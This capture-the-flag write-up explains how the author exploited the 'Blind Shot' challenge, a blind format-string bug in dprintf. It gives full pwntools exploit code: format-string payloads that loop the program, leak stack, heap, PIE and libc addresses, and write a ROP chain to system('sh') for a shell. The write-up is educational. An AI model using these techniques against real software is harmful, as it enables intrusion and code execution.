# Blind Shot

(./blindshot)

nc pwn01.chal.ctf.westerns.tokyo 12463

Solves: 8

## Analysis
The challenge binary is very simple. There are two functions, `main` and `service`.
The `main` function opens a file descriptor to the file `/dev/null` and passes it to `service` as first argument. 
Service then calls `dprintf(fd, user_input)`, where `user_input` is read via `scanf('%200ms')`, so it is a pointer on the heap to our input.
If `dprintf` fails, the binary exits directly with an error code.
Otherwise, it calls `printf("done")` and then exits normally via return to main.

This is a classic format-string vulnerability, with two twists:

- we cannot see the output
- our input is not stored on the stack, so we cannot access it as printf argument.

The second issue is not a big problem, since we can write data to the stack ourselves using format strings. 
But the first issue is hard, since it prevents us from leaking anything.

## Step 1: construct a loop
Exploiting the bug in a single shot seems pretty hard.
Therefore, we will find a way to make the binary go into a loop, so that we can trigger the bug as often as we like.
This also provides a nice way to validate if our assumptions gathered from local observation match what happens on the server.

Since we don't know any addresses, we have to work with what's already on the stack.
We're looking for some positions on the stack that point to other locations which themselves point to another location on the stack.
Given such a location, we can overwrite parts of the second address using `%{size_specifier}n`.
Let's dump the stack on a system that we assume is similar to the remote system (matching libc), Ubuntu 20.04, directly before the printf call:

```
00:0000│ rsp  0x7fffffffe980 —▸ 0x7fffffffead8 —▸ 0x7fffffffed31 ◂— 'SHELL=/bin/bash'
01:0008│      0x7fffffffe988 ◂— 0x550355555259
02:0010│      0x7fffffffe990 ◂— 0x2
03:0018│      0x7fffffffe998 —▸ 0x5555555553ad (__libc_csu_init+77) ◂— add    rbx, 1
04:0020│      0x7fffffffe9a0 —▸ 0x5555555596b0 ◂— 0x646173 /* 'sad' */
05:0028│      0x7fffffffe9a8 ◂— 0xb5def1d499cde700
06:0030│ rbp  0x7fffffffe9b0 —▸ 0x7fffffffe9d0 ◂— 0x0
07:0038│      0x7fffffffe9b8 —▸ 0x55555555529b (main+63) ◂— leave
08:0040│      0x7fffffffe9c0 —▸ 0x7fffffffeac0 ◂— 0x1
09:0048│      0x7fffffffe9c8 ◂— 0x300000000
0a:0050│      0x7fffffffe9d0 ◂— 0x0
0b:0058│      0x7fffffffe9d8 —▸ 0x7ffff7dec0b3 (__libc_start_main+243) ◂— mov    edi, eax
0c:0060│      0x7fffffffe9e0 —▸ 0x7ffff7ffc620 (_rtld_global_ro) ◂— 0x5043700000000
0d:0068│      0x7fffffffe9e8 —▸ 0x7fffffffeac8 —▸ 0x7fffffffed16 ◂— '/root/blind-shot/blindshot'
0e:0070│      0x7fffffffe9f0 ◂— 0x100000000
0f:0078│      0x7fffffffe9f8 —▸ 0x55555555525c (main) ◂— endbr64
10:0080│      0x7fffffffea00 —▸ 0x555555555360 (__libc_csu_init) ◂— endbr64
11:0088│      0x7fffffffea08 ◂— 0x966d0eb124d5ee87
12:0090│      0x7fffffffea10 —▸ 0x555555555140 (_start) ◂— endbr64
13:0098│      0x7fffffffea18 —▸ 0x7fffffffeac0 ◂— 0x1
14:00a0│      0x7fffffffea20 ◂— 0x0
... ↓
16:00b0│      0x7fffffffea30 ◂— 0x6992f14ef715ee87
17:00b8│      0x7fffffffea38 ◂— 0x6992e10ca41bee87
18:00c0│      0x7fffffffea40 ◂— 0x0
... ↓
1b:00d8│      0x7fffffffea58 ◂— 0x1
1c:00e0│      0x7fffffffea60 —▸ 0x7fffffffeac8 —▸ 0x7fffffffed16 ◂— '/root/blind-shot/blindshot'
1d:00e8│      0x7fffffffea68 —▸ 0x7fffffffead8 —▸ 0x7fffffffed31 ◂— 'SHELL=/bin/bash'
1e:00f0│      0x7fffffffea70 —▸ 0x7ffff7ffe190 —▸ 0x555555554000 ◂— 0x10102464c457f
1f:00f8│      0x7fffffffea78 ◂— 0x0
```

The first argument on the stack has printf-argument offset `5`, so the locations matching our criteria can be found at arguments 5, 18, 33 and 34.
They point to the arguments at location `48` (at this offset is the pointer `0x7fffffffed31` to the beginning of the environment variables block) and `46` (here, the value `0x7fffffffed16` pointing to the program name is stored).
We want to modify one of those pointers so that it points to the location of the return address to main (`rbp + 8`).
Then, we can use the pointer to overwrite that address.

Stack offsets are very variable, so we'd rather not want to hardcode the lower bytes of the return address location.
But we don't need to do that. 
The `%*c` specifier reads the width of the field from an argument, so it'll write exactly as many bytes as there are in the 32 bit argument (only works correctly for positive 32 bit values, otherwise bitwise negation of the argument is written because libc then inverts it).
If we write N bytes after that, we can effectively do addition `N + value read by %*c` with printf.
Since the output goes to `/dev/null`, we also don't need to worry about producing to much output.

There's one last complication: we want to do this using a single `printf` call.
But as soon as `printf` encounters a positional argument (like `%1$c`), it'll [switch to `printf_positional`](https://github.com/bminor/glibc/blob/cdf645427d176197b82f44308a5e131d69fb53ad/stdio-common/vfprintf-internal.c#L1557).
`printf_positional` then works in a two-pass way, first reading all argument values and then executing the corresponding actions.
This means that as soon as we use a positional argument, we can no longer overwrite the values used by later arguments.

Keeping this in mind, we can contruct the following payload to send the program into a loop:

```

STAGE0 = "".join([
    # pop 4 arguments, and then use %*c to output as many bytes as specified by the fifth argument
    f"%0c%0c%0c%0c%*c",      # next arg offset: 7
    
    # add 0xfedc to the fifth argument (-9 since each %c outputs one byte, and we have 9 %c before the write)
    f"%{0xfedc - 9}c",       # next: 8
    f"%0c" * 3,              # next: 11
    
    # the next argument is the saved RBP. Use this to store the low byte of the current value 
    f"%hhn",                 # next: 12
    
    # pop arguments until we reach argument 18
    f"%0c" * 6,              # next: 18
    
    # change the pointer at the location pointed-to by arg 18 so that it points to the return address location
    # we can use positional arguments after this, because we don't need to change any more arguments
    f"%hn",
    
    # now, we don't exactly how many bytes we have already written
    # but we want to do an exact overwrite of the low byte of the return address to main
    # we know that the address we wrote is always 8-byte aligned, so we can simply multiply by 16
    # to ensure that the lsb is `8 * 16` = `0x80`
    f"%1$*15$c" * 15,      # add the value stored before 15 times (so we multiply by 16)

    # add 6 15 times (because the stored value is 6 less because of the 6 %c)
    # add 0xe so that the lsb will be `0x8e` (the lsb of the address we want to return to)
    f"%{15 * 6 + 0x0e}c",  
    
    # overwrite the return address
    f"%46$hhn",
])
```

Because of the aforementioned limitation that `%*c` only works for positive arguments, this exploit only works with a chance of `50%`.
We can simply execute it in a loop until it succeeds one time:

```python
for _ in range(20):
    connect()
    try:
        r.sendlineafter("> ", STAGE0)
        r.recvline_contains("done")
        
        # success: we should get the prompt again
        r.recvuntil("> ")
        break
    except EOFError:
        pass

```

After this initial stage, we now have a pointer to the return address at argument 46.
So in the next stages, we can simply use this pointer to set the return address to whatever we want.

# Step 2: enabling output and leaking addresses
Looking at the disassembly of main again, we note something interesting directly before the call to the `service` function:

```asm
0000127e  8945fc             mov     dword [rbp-0x4 {fd}], eax
00001281  837dfc00           cmp     dword [rbp-0x4 {fd}], 0x0
00001285  7907               jns     0x128e

00001287  b8ffffffff         mov     eax, 0xffffffff
0000128c  eb0d               jmp     0x129b

0000128e  8b45fc             mov     eax, dword [rbp-0x4 {fd}]
00001291  0fbec0             movsx   eax, al
00001294  89c7               mov     edi, eax
00001296  e802000000         call    service
```

Notice how the value of `eax` is what get's stored in the local `fd` variable.
If we can control the value of `eax` before jumping there, we can override the `fd` that's used in the `dprinf` call. If we check what the `eax` value is at the return from `service`, we find that it is set to the value returned from `dprintf`. And `dprintf` returns the amount of bytes written, so we control that!

So, here's the next payload implementing that:

```python
STAGE1 = "".join([
    # we need to overwrite the return address again, so that the program does not exit
    # instead, we want it to jump to the address with lbs 0x7e
    f"%{0x7e}c%46$hhn",
    
    # now, make sure that the lsb of the return value of dprintf is 0x1 (the value we want for fd)
    # so we write additional 0x101-0x7e bytes
    f"%{0x101-0x7e}c",
])
r.sendlineafter("> ", STAGE1)
```

After this, we can easily leak all the interesting addresses:

```python
# leak all the things
STAGE2 = "".join([
    # set ret to loop
    f"%{0x8e}c%46$hhn",

    "LEAKS:",

    # leak stack
    "%5$p,",

    # leak heap
    "%9$p,",

    # leak pie base
    "%12$p,",

    # leak libc
    "%16$p,",
])

r.sendlineafter("> ", STAGE2)
r.recvuntil("LEAKS:")
stack_ptr, heap_ptr, pie_ptr, libc_ptr = [int(x.decode(), 16) for x in r.recvline().split(b",")[:-1]]
info(f"{stack_ptr = :#x} {heap_ptr = :#x} {pie_ptr = :#x} {libc_ptr = :#x}")

rbp = stack_ptr - 0x128
libc.address = libc_ptr - libc.symbols.__libc_start_main - 243
info(f"libc base: {libc.address:#x}")
```

# Step 3: get the shell
Since we now know all addresses, we can write a rop chain in the place of the return address from main and then exit the program normally (triggering our rop chain) to get the shell.
We will write the rop chain in multiple steps, because it is hard to put it all into a single 200-byte long format string.


```python
rop = ROP(libc)
rop.call('system', (next(libc.search(b"sh\0")), ))
chain = rop.chain()

# align stack
count = len(chain) // 8
RET = rop.search(move=0).address
chain = p64(RET) * 3 + chain

def make_write(addr, byte):
    assert addr & ~0xffff == stack_ptr & ~0xffff
    return "".join([
        # set ret to loop
        f"%{0x8e}c%46$hhn",

        # set the write pointer
        f"%{(addr & 0xffff) - 0x8e}c%5$hn",

        # return, because arguments are cached for a single printf call
        "\n",
        # now, the pointer at argument 48 points to the location where we want to write

        # set ret to loop
        f"%{0x8e}c%46$hhn",

        # write byte
        f"%{(byte - 0x8e) % 0x100}c%48$hhn" + "\n",
    ])

main_ret = rbp + 0x28

# performance: send it all in a single send call so we don't need to wait for the server RTT each time
r.send("".join(make_write(main_ret + i, v) for i, v in enumerate(chain)))

r.interactive()
```

With this, we get the shell and can find the flag: `TWCTF{0nc3_5h07,7w1c3_r3wr173!}`
